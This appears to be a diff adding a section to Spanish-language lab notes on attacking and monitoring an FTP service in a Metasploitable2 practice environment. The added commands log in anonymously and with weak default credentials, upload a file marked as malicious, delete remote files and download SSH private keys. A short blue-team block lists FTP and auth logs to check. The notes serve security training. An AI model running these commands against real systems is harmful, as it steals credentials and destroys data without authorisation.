@@ -167,3 +167,53 @@ run
 
 creds
 ```
+
+- conexión al servicio
+
+```sh
+ftp -inv server.local <<EOF
+user anonymous anonymous
+ls -a
+EOF
+
+ftp server.local
+  # login: anonymous:anonymous
+{
+help
+
+pwd
+ls -a
+}
+
+ftp server.local
+  # login: user:user
+{
+pwd
+ls -a
+
+put test.txt  # subir fichero malicioso !!!!!!!!
+delete test.txt # eliminar ficheros remotos !!!!!!!!
+
+cd .ssh
+get id_dsa data/id_dsa  # descargar claves ssh !!!!!!!!
+get id_dsa.pub data/id_dsa.pub
+
+quit
+}
+```
+
+
+- **BLUE TEAM**
+
+```sh
+# vagrant ssh debian-soc-vagrant-vm
+# sudo docker exec -it metasploitable2 bash
+
+cat /var/log/vsftpd.log
+cat /var/log/proftpd/proftpd.log
+cat /var/log/syslog
+cat /var/log/auth.log
+```
+
+
+## SSH
